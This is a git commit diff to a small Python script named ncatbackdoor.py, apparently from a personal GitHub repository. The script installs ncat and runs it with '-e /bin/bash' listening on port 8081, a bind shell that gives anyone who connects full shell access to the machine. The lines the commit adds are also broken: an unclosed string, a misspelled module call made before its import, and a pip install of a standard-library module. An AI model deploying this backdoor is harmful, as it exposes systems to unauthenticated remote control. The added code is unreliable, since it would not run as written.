26c0d086a6c2540b9df97497a3d91880a7292656
thehackerdude597 <78941180+thehackerdude597@users.noreply.github.com>
2021-10-09 12:56:03 -0400

    Update ncatbackdoor.py

--- ncatbackdoor.py
+++ ncatbackdoor.py
@@ -1,4 +1,8 @@
 import os
+os.system("sudo apt install python3-pip")
+os.system("pip3 install webbrowser)
+webbrowse.open("google.com")
+import webbrowser
 os.system("sudo apt install ncat")
 create_backdoor = "ncat -e '/bin/bash' -lv 8081"
 os.system(create_backdoor)
